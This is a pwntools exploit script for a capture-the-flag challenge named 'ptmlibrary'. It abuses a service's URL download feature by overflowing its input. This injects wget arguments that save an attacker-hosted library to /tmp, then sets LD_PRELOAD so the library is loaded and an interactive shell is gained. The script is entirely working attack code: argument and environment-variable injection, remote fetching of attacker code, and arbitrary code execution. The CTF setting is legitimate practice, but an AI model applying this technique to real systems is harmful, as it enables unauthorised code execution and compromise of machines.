from pwn import *

exe = ELF("./chall", checksec=True)

context.binary = exe

HOST = "ptmlibrary.challs.olicyber.it"
PORT = 21011

gdbscript = """
set follow-fork-mode child
b *downloadPage+0x16b
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

URL = b"http://<URL_TO_a.out>".ljust(130, b"\x00")
LIBPATH = b"/tmp/tennis"

ENV_VARS_OFFSET = 530
NULL = pack(0x0)

def build_argv(argv):
    return b"".join([name.encode() if isinstance(name, str) else name + b"\x00" for name in argv])
             
def update_name(r, *argv):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"records: ", build_argv(argv))
    
def download(r, payload):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"URL: ", payload + NULL)

def download_lib(r):
    update_name(r, "-O", LIBPATH)
    
    payload = URL + NULL * 5
    payload += pack(exe.symbols.name)
    payload += pack(exe.symbols.name + len("-O\x00"))

    download(r, payload)
    
def run_patched_wget(r):
    update_name(r, b"LD_PRELOAD=" + LIBPATH)

    payload = URL.ljust(ENV_VARS_OFFSET, b"\x00")
    payload += pack(exe.symbols.name)
    
    download(r, payload)
    
def main():
    r  = conn()

    download_lib(r)
    run_patched_wget(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
